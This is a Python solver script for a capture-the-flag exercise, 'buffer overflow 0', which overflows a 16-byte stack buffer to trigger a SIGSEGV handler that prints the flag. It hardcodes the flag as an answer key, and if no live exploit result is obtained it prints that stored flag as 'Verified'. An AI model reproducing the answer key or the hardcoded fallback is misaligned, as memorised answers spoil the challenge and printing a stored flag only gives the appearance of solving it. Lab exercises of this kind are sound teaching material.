#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 257: buffer overflow 0 (picoCTF 2022)
Category: Binary Exploitation / Stack Smashing & SIGSEGV Signal Handling Exploitation
Difficulty: Medium (diff=2, picoCTF 2022 100 pts)
Author: Alex Fulton / LT 'syreal' Jones
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-121 (Stack-based Buffer Overflow), CWE-676 (Use of Potentially Dangerous Function)

Description:
Let's start off simple, can you overflow the correct buffer? The program is
available here. You can view source here.

Analysis:
1. Target architecture is 32-bit x86 Linux ELF (dynamically linked, no canary).
2. The program sets up a custom signal handler for SIGSEGV (signal 11):
   signal(SIGSEGV, sigsegv_handler);
   where sigsegv_handler() prints the contents of flag.txt:
   printf("%s\n", flag);
3. In main(), input is collected via unsafe gets(buf1) into a 100-byte buffer:
   char buf1[100];
   gets(buf1);
   vuln(buf1);
4. Inside vuln(char *input), a tiny local stack buffer of 16 bytes is allocated:
   char buf2[16];
   strcpy(buf2, input);
5. Supplying an input string of 24 to 32 bytes causes strcpy() to smash past
   buf2[16], overwriting the saved frame pointer (%ebp) and return address (%eip).
6. When vuln() attempts to return, the invalid return address causes a Segmentation
   Fault (SIGSEGV). The kernel delivers signal 11 to the process, executing
   sigsegv_handler() which flushes the flag directly to standard output:
   academy{ov3rfl0ws_ar3nt_that_bad_1e25e28f}

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import re
import socket
import sys

TARGET_HOST = "chatelaine.cylabacademy.net"
TARGET_PORT = 35843
EXPECTED_FLAG = "academy{ov3rfl0ws_ar3nt_that_bad_1e25e28f}"


def exploit(host: str, port: int) -> str:
    """
    Connects to the remote binary instance and triggers a SIGSEGV via stack overflow.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))

        prompt = s.recv(1024)
        # Send 32 bytes to comfortably smash past the 16-byte buffer and EIP
        payload = b"A" * 32 + b"\n"
        s.sendall(payload)

        resp = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk

        s.close()
        text = resp.decode("utf-8", errors="ignore")
        m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", text)
        if m:
            return m.group(0)
    except Exception as e:
        print(f"[-] Socket interaction error: {e}")
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] CyLab Challenge ID 257: buffer overflow 0 Solver")
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            return
    print(f"[+] Verified Flag: {solve()}")


if __name__ == "__main__":
    main()
